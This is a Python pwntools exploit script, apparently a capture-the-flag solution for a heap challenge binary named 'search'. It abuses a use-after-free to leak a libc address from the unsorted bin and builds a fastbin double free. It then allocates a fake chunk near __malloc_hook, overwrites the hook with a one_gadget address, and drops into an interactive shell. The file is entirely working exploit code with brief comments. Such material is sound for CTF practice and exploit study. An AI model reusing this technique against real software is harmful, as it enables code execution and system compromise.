# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
name = './search'
p = process(name)

if args.G:
    gdb.attach(p)

def search(s):
    p.recvuntil("3: Quit\n")
    p.sendline("1")
    p.recvuntil("Enter the word size:\n")
    p.sendline(str(len(s)))
    p.recvuntil("Enter the word:\n")
    p.sendline(s)

def delete(s):
    p.recvuntil("Delete this sentence (y/n)?\n")
    p.sendline(s)
    
def index(s):
    p.recvuntil("3: Quit\n")
    p.sendline("2")
    p.recvuntil("Enter the sentence size:\n")
    p.sendline(str(len(s)))
    p.recvuntil("Enter the sentence:\n")
    p.sendline(s)

def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset
 
unsortedbin_offset_main_arena = offset_bin_main_arena(0)

index("a"*0x85 + " s")
search("s")
delete('y')
search("\x00")
p.recvuntil("Found 135: ")
lib_addr = u64(p.recv(6) + '\x00\x00')
success("lib_addr: " + hex(lib_addr))
one_gadget_addr = lib_addr - 0x399b58 + 0x3f306
main_arena_addr = lib_addr - 0x58
delete('n')

index('a'*0x5d + ' d')
index('b'*0x5d + ' d')
index('c'*0x5d + ' d')

search("d")
delete("y")
delete("y")
delete("y")

search("\x00")
delete("y")
delete("n")
delete("n")   # fastbin 的情况为 b->a->b->a->...
              # double_free已经构成
fake_chunk_addr = main_arena_addr - 0x33
fake_chunk = p64(fake_chunk_addr).ljust(0x60, 'f')

index(fake_chunk)
index('a' * 0x60)   #分配chunk_a
index('b' * 0x60)   #分配chunk_b
payload = '|/bin/sh;'
payload += (0x13-len(payload))*'a' + p64(one_gadget_addr)  
payload = payload.ljust(0x60, 'f')
index(payload)      #malloc_hook为one_gadget
p.interactive()
